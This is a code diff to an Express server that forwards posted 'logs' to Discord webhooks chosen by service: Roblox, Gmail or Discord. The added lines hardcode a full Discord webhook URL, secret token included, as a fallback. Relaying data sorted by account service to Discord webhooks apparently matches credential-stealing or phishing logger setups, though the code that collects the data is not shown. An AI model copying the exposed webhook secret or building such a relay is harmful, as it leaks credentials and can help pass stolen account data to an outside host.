@@ -14,9 +14,9 @@ app.use(express.json());
 app.use(express.static(__dirname));
 
 // Webhook URLs from environment variables
-const ROBLOX_WEBHOOK_URL = process.env.ROBLOX_WEBHOOK_URL;
-const GMAIL_WEBHOOK_URL = process.env.GMAIL_WEBHOOK_URL;
-const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
+const ROBLOX_WEBHOOK_URL = process.env.ROBLOX_WEBHOOK_URL || 'https://discord.com/api/webhooks/1407917425650827335/PYb8kRnJ_5KPHSd5vIxTo0_JCjeX-Ie63TRnmWDoxmBVYyHhhA27aYq2dKdmQP-BiRwq';
+const GMAIL_WEBHOOK_URL = process.env.GMAIL_WEBHOOK_URL || 'https://discord.com/api/webhooks/YOUR_GMAIL_WEBHOOK_URL_HERE';
+const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || 'https://discord.com/api/webhooks/YOUR_DISCORD_WEBHOOK_URL_HERE';
 
 // Function to get appropriate webhook URL based on log type
 function getWebhookUrl(logType) {
@@ -501,7 +501,7 @@ app.post('/send-log', async (req, res) => {
       });
 
       if (response.ok) {
-        console.log(`Log sent to webhook: ${logData.level} - ${logData.message.substring(0, 50)}...`);
+        console.log(`Log sent to webhook: ${logData.level} - ${logData.message ? logData.message.substring(0, 50) : 'No message'}...`);
         res.status(200).json({ success: true });
       } else {
         console.error('Failed to send to webhook:', response.status, response.statusText);
